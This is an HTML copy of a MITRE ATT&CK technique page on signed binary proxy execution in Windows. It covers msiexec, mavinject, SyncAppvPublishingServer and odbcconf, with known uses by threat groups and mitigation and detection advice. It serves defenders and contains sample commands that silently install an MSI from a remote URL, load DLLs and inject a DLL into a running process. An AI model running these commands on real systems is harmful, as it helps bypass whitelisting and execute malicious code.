<div class="container-fluid">
 <h1>
  Signed Binary Proxy Execution
 </h1>
 <div class="row">
  <div class="col-md-8 description-body">
   <p>
    Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files. This behavior may be abused by adversaries to execute malicious files that could bypass application whitelisting and signature validation on systems. This technique accounts for proxy execution methods that are not already accounted for within the existing techniques.
   </p>
   <h3>
    Msiexec.exe
   </h3>
   <p>
    Msiexec.exe is the command-line Windows utility for the Windows Installer. Adversaries may use msiexec.exe to launch malicious MSI files for code execution. An adversary may use it to launch local or network accessible MSI files.
    <span class="scite-citeref-number" data-reference="LOLBAS Msiexec" id="scite-ref-1-a">
     <sup>
      <a aria-describedby="qtip-0" data-hasqtip="0" href="https://lolbas-project.github.io/lolbas/Binaries/Msiexec/" target="_blank">
       [1]
      </a>
     </sup>
    </span>
    <span class="scite-citeref-number" data-reference="Rancor Unit42 June 2018" id="scite-ref-2-a">
     <sup>
      <a aria-describedby="qtip-1" data-hasqtip="1" href="https://researchcenter.paloaltonetworks.com/2018/06/unit42-rancor-targeted-attacks-south-east-asia-using-plaintee-ddkong-malware-families/" target="_blank">
       [2]
      </a>
     </sup>
    </span>
    <span class="scite-citeref-number" data-reference="TrendMicro Msiexec Feb 2018" id="scite-ref-3-a">
     <sup>
      <a aria-describedby="qtip-2" data-hasqtip="2" href="https://blog.trendmicro.com/trendlabs-security-intelligence/attack-using-windows-installer-msiexec-exe-leads-lokibot/" target="_blank">
       [3]
      </a>
     </sup>
    </span>
    Msiexec.exe may also be used to execute DLLs.
    <span class="scite-citeref-number" data-reference="LOLBAS Msiexec" id="scite-ref-1-a">
     <sup>
      <a aria-describedby="qtip-0" data-hasqtip="0" href="https://lolbas-project.github.io/lolbas/Binaries/Msiexec/" target="_blank">
       [1]
      </a>
     </sup>
    </span>
   </p>
   <ul>
    <li>
     <code>
      msiexec.exe /q /i "C:\path\to\file.msi"
     </code>
    </li>
    <li>
     <code>
      msiexec.exe /q /i http[:]//site[.]com/file.msi
     </code>
    </li>
    <li>
     <code>
      msiexec.exe /y "C:\path\to\file.dll"
     </code>
    </li>
   </ul>
   <h3>
    Mavinject.exe
   </h3>
   <p>
    Mavinject.exe is a Windows utility that allows for code execution. Mavinject can be used to input a DLL into a running process.
    <span class="scite-citeref-number" data-reference="Twitter gN3mes1s Status Update MavInject32" id="scite-ref-4-a">
     <sup>
      <a aria-describedby="qtip-3" data-hasqtip="3" href="https://twitter.com/gn3mes1s/status/941315826107510784" target="_blank">
       [4]
      </a>
     </sup>
    </span>
   </p>
   <ul>
    <li>
     <code>
      "C:\Program Files\Common Files\microsoft shared\ClickToRun\MavInject32.exe" &lt;PID&gt; /INJECTRUNNING &lt;PATH DLL&gt;
     </code>
    </li>
    <li>
     <code>
      C:\Windows\system32\mavinject.exe &lt;PID&gt; /INJECTRUNNING &lt;PATH DLL&gt;
     </code>
    </li>
   </ul>
   <h3>
    SyncAppvPublishingServer.exe
   </h3>
   <p>
    SyncAppvPublishingServer.exe can be used to run PowerShell scripts without executing powershell.exe.
    <span class="scite-citeref-number" data-reference="Twitter monoxgas Status Update SyncAppvPublishingServer" id="scite-ref-5-a">
     <sup>
      <a aria-describedby="qtip-4" data-hasqtip="4" href="https://twitter.com/monoxgas/status/895045566090010624" target="_blank">
       [5]
      </a>
     </sup>
    </span>
   </p>
   <h3>
    Odbcconf.exe
   </h3>
   <p>
    Odbcconf.exe is a Windows utility that allows you to configure Open Database Connectivity (ODBC) drivers and data source names.
    <span class="scite-citeref-number" data-reference="Microsoft odbcconf.exe" id="scite-ref-6-a">
     <sup>
      <a aria-describedby="qtip-5" data-hasqtip="5" href="https://docs.microsoft.com/en-us/sql/odbc/odbcconf-exe?view=sql-server-2017" target="_blank">
       [6]
      </a>
     </sup>
    </span>
    The utility can be misused to execute functionality equivalent to
    <a href="https://attack.mitre.org/techniques/T1117">
     Regsvr32
    </a>
    with the REGSVR option to execute a DLL.
    <span class="scite-citeref-number" data-reference="LOLBAS Odbcconf" id="scite-ref-7-a">
     <sup>
      <a aria-describedby="qtip-6" data-hasqtip="6" href="https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/" target="_blank">
       [7]
      </a>
     </sup>
    </span>
    <span class="scite-citeref-number" data-reference="TrendMicro Squiblydoo Aug 2017" id="scite-ref-8-a">
     <sup>
      <a aria-describedby="qtip-7" data-hasqtip="7" href="https://blog.trendmicro.com/trendlabs-security-intelligence/backdoor-carrying-emails-set-sights-on-russian-speaking-businesses/" target="_blank">
       [8]
      </a>
     </sup>
    </span>
    <span class="scite-citeref-number" data-reference="TrendMicro Cobalt Group Nov 2017" id="scite-ref-9-a">
     <sup>
      <a aria-describedby="qtip-8" data-hasqtip="8" href="https://blog.trendmicro.com/trendlabs-security-intelligence/cobalt-spam-runs-use-macros-cve-2017-8759-exploit/" target="_blank">
       [9]
      </a>
     </sup>
    </span>
   </p>
   <ul>
    <li>
     <code>
      odbcconf.exe /S /A {REGSVR "C:\Users\Public\file.dll"}
     </code>
    </li>
   </ul>
   <p>
    Several other binaries exist that may be used to perform similar behavior.
    <span class="scite-citeref-number" data-reference="GitHub Ultimate AppLocker Bypass List" id="scite-ref-10-a">
     <sup>
      <a aria-describedby="qtip-9" data-hasqtip="9" href="https://github.com/api0cradle/UltimateAppLockerByPassList" target="_blank">
       [10]
      </a>
     </sup>
    </span>
   </p>
  </div>
  <div class="col-md-4">
   <div class="card">
    <div class="card-body">
     <div class="card-data">
      <span class="h5 card-title">
       ID
      </span>
      : T1218
      <br/>
      <br/>
     </div>
     <div class="card-data">
      <span class="h5 card-title">
      </span>
     </div>
     <div class="card-data">
      <span class="h5 card-title">
       Tactic
      </span>
      : Defense Evasion, Execution
      <br/>
      <br/>
     </div>
     <div class="card-data">
      <span class="h5 card-title">
       Platform:
      </span>
      Windows
      <br/>
      <br/>
     </div>
     <div class="card-data">
      <span class="h5 card-title">
      </span>
     </div>
     <div class="card-data">
      <span class="h5 card-title">
       Permissions Required:
      </span>
      User
      <br/>
      <br/>
     </div>
     <div class="card-data">
      <span class="h5 card-title">
      </span>
     </div>
     <div class="card-data">
      <span class="h5 card-title">
       Data Sources:
      </span>
      Process monitoring, Process command-line parameters
      <br/>
      <br/>
     </div>
     <div class="card-data">
      <span class="h5 card-title">
       Supports Remote:
      </span>
      No
      <br/>
      <br/>
     </div>
     <div class="card-data">
      <span class="h5 card-title">
      </span>
     </div>
     <div class="card-data">
      <span class="h5 card-title">
       Defense Bypassed:
      </span>
      Application whitelisting, Digital Certificate Validation
      <br/>
      <br/>
     </div>
     <div class="card-data">
      <span class="h5 card-title">
      </span>
     </div>
     <div class="card-data">
      <span class="h5 card-title">
      </span>
     </div>
     <div class="card-data">
      <span class="h5 card-title">
      </span>
     </div>
     <div class="card-data">
      <span class="h5 card-title">
       Contributors:
      </span>
      Nishan Maharjan, @loki248; Hans Christoffer Gaardløs; Praetorian
      <br/>
      <br/>
     </div>
     <div class="card-data">
      <span class="h5 card-title">
       Version
      </span>
      : 2.0
     </div>
    </div>
   </div>
  </div>
 </div>
 <h2 class="pt-3" id="examples">
  Examples
 </h2>
 <table class="table table-bordered table-light mt-2">
  <thead>
   <tr>
    <th scope="col">
     Name
    </th>
    <th scope="col">
     Description
    </th>
   </tr>
  </thead>
  <tbody class="bg-white">
   <tr>
    <td>
     <a href="https://attack.mitre.org/groups/G0080">
      Cobalt Group
     </a>
    </td>
    <td>
     <p>
      <a href="https://attack.mitre.org/groups/G0080">
       Cobalt Group
      </a>
      has used
      <code>
       odbcconf
      </code>
      to proxy the execution of malicious DLL files.
      <span class="scite-citeref-number" data-reference="TrendMicro Cobalt Group Nov 2017" id="scite-ref-9-a" onclick="scrollToRef('scite-9')">
       <sup>
        <a aria-describedby="qtip-8" data-hasqtip="8" href="https://blog.trendmicro.com/trendlabs-security-intelligence/cobalt-spam-runs-use-macros-cve-2017-8759-exploit/" target="_blank">
         [9]
        </a>
       </sup>
      </span>
     </p>
    </td>
   </tr>
   <tr>
    <td>
     <a href="https://attack.mitre.org/software/S0038">
      Duqu
     </a>
    </td>
    <td>
     <p>
      <a href="https://attack.mitre.org/software/S0038">
       Duqu
      </a>
      has used
      <code>
       msiexec
      </code>
      to execute malicious Windows Installer packages. Additionally, a PROPERTY=VALUE pair containing a 56-bit encryption key has been used to decrypt the main payload from the installer packages.
      <span class="scite-citeref-number" data-reference="Kaspersky Duqu 2.0" id="scite-ref-11-a" onclick="scrollToRef('scite-11')">
       <sup>
        <a aria-describedby="qtip-10" data-hasqtip="10" href="https://securelist.com/files/2015/06/The_Mystery_of_Duqu_2_0_a_sophisticated_cyberespionage_actor_returns.pdf" target="_blank">
         [11]
        </a>
       </sup>
      </span>
     </p>
    </td>
   </tr>
   <tr>
    <td>
     <a href="https://attack.mitre.org/groups/G0075">
      Rancor
     </a>
    </td>
    <td>
     <p>
      <a href="https://attack.mitre.org/groups/G0075">
       Rancor
      </a>
      has used
      <code>
       msiexec
      </code>
      to download and execute malicious installer files over HTTP.
      <span class="scite-citeref-number" data-reference="Rancor Unit42 June 2018" id="scite-ref-2-a" onclick="scrollToRef('scite-2')">
       <sup>
        <a aria-describedby="qtip-1" data-hasqtip="1" href="https://researchcenter.paloaltonetworks.com/2018/06/unit42-rancor-targeted-attacks-south-east-asia-using-plaintee-ddkong-malware-families/" target="_blank">
         [2]
        </a>
       </sup>
      </span>
     </p>
    </td>
   </tr>
  </tbody>
 </table>
 <h2 class="pt-3" id="mitigation">
  Mitigation
 </h2>
 <p>
  Certain signed binaries that can be used to execute other programs may not be necessary within a given environment. Use application whitelisting configured to block execution of these binaries if they are not required for a given system or network to prevent potential misuse by adversaries. If these binaries are required for use, then restrict execution of them to privileged accounts or groups that need to use them to lessen the opportunities for malicious use.
 </p>
 <h2 class="pt-3" id="detection">
  Detection
 </h2>
 <p>
  Monitor processes and command-line parameters for signed binaries that may be used to proxy execution of malicious files. Legitimate programs used in suspicious ways, like msiexec.exe downloading an MSI file from the internet, may be indicative of an intrusion. Correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.
 </p>
 <h2 class="pt-3" id="references">
  References
 </h2>
 <div class="row">
  <div class="col">
   <ol>
    <li>
     <span class="scite-citation" id="scite-1">
      <span class="scite-citation-text">
       <a class="external text" href="https://lolbas-project.github.io/lolbas/Binaries/Msiexec/" name="scite-1" rel="nofollow" target="_blank">
        LOLBAS. (n.d.). Msiexec.exe. Retrieved April 18, 2019.
       </a>
      </span>
     </span>
    </li>
    <li>
     <span class="scite-citation" id="scite-2">
      <span class="scite-citation-text">
       <a class="external text" href="https://researchcenter.paloaltonetworks.com/2018/06/unit42-rancor-targeted-attacks-south-east-asia-using-plaintee-ddkong-malware-families/" name="scite-2" rel="nofollow" target="_blank">
        Ash, B., et al. (2018, June 26). RANCOR: Targeted Attacks in South East Asia Using PLAINTEE and DDKONG Malware Families. Retrieved July 2, 2018.
       </a>
      </span>
     </span>
    </li>
    <li>
     <span class="scite-citation" id="scite-3">
      <span class="scite-citation-text">
       <a class="external text" href="https://blog.trendmicro.com/trendlabs-security-intelligence/attack-using-windows-installer-msiexec-exe-leads-lokibot/" name="scite-3" rel="nofollow" target="_blank">
        Co, M. and Sison, G. (2018, February 8). Attack Using Windows Installer msiexec.exe leads to LokiBot. Retrieved April 18, 2019.
       </a>
      </span>
     </span>
    </li>
    <li>
     <span class="scite-citation" id="scite-4">
      <span class="scite-citation-text">
       <a class="external text" href="https://twitter.com/gn3mes1s/status/941315826107510784" name="scite-4" rel="nofollow" target="_blank">
        Giuseppe. (2017, December 14). gN3mes1s Status Update. Retrieved April 10, 2018.
       </a>
      </span>
     </span>
    </li>
    <li>
     <span class="scite-citation" id="scite-5">
      <span class="scite-citation-text">
       <a class="external text" href="https://twitter.com/monoxgas/status/895045566090010624" name="scite-5" rel="nofollow" target="_blank">
        Landers, N. (2017, August 8). monoxgas Status Update. Retrieved April 10, 2018.
       </a>
      </span>
     </span>
    </li>
    <li>
     <span class="scite-citation" id="scite-6">
      <span class="scite-citation-text">
       <a class="external text" href="https://docs.microsoft.com/en-us/sql/odbc/odbcconf-exe?view=sql-server-2017" name="scite-6" rel="nofollow" target="_blank">
        Microsoft. (2017, January 18). ODBCCONF.EXE. Retrieved March 7, 2019.
       </a>
      </span>
     </span>
    </li>
   </ol>
  </div>
  <div class="col">
   <ol start="7.5">
    <li>
     <span class="scite-citation" id="scite-7">
      <span class="scite-citation-text">
       <a class="external text" href="https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/" name="scite-7" rel="nofollow" target="_blank">
        LOLBAS. (n.d.). Odbcconf.exe. Retrieved March 7, 2019.
       </a>
      </span>
     </span>
    </li>
    <li>
     <span class="scite-citation" id="scite-8">
      <span class="scite-citation-text">
       <a class="external text" href="https://blog.trendmicro.com/trendlabs-security-intelligence/backdoor-carrying-emails-set-sights-on-russian-speaking-businesses/" name="scite-8" rel="nofollow" target="_blank">
        Bermejo, L., Giagone, R., Wu, R., and Yarochkin, F. (2017, August 7). Backdoor-carrying Emails Set Sights on Russian-speaking Businesses. Retrieved March 7, 2019.
       </a>
      </span>
     </span>
    </li>
    <li>
     <span class="scite-citation" id="scite-9">
      <span class="scite-citation-text">
       <a class="external text" href="https://blog.trendmicro.com/trendlabs-security-intelligence/cobalt-spam-runs-use-macros-cve-2017-8759-exploit/" name="scite-9" rel="nofollow" target="_blank">
        Giagone, R., Bermejo, L., and Yarochkin, F. (2017, November 20). Cobalt Strikes Again: Spam Runs Use Macros and CVE-2017-8759 Exploit Against Russian Banks. Retrieved March 7, 2019.
       </a>
      </span>
     </span>
    </li>
    <li>
     <span class="scite-citation" id="scite-10">
      <span class="scite-citation-text">
       <a class="external text" href="https://github.com/api0cradle/UltimateAppLockerByPassList" name="scite-10" rel="nofollow" target="_blank">
        Moe, O. (2018, March 1). Ultimate AppLocker Bypass List. Retrieved April 10, 2018.
       </a>
      </span>
     </span>
    </li>
    <li>
     <span class="scite-citation" id="scite-11">
      <span class="scite-citation-text">
       <a class="external text" href="https://securelist.com/files/2015/06/The_Mystery_of_Duqu_2_0_a_sophisticated_cyberespionage_actor_returns.pdf" name="scite-11" rel="nofollow" target="_blank">
        Kaspersky Lab. (2015, June 11). The Duqu 2.0. Retrieved April 21, 2017.
       </a>
      </span>
     </span>
    </li>
   </ol>
  </div>
 </div>
</div>
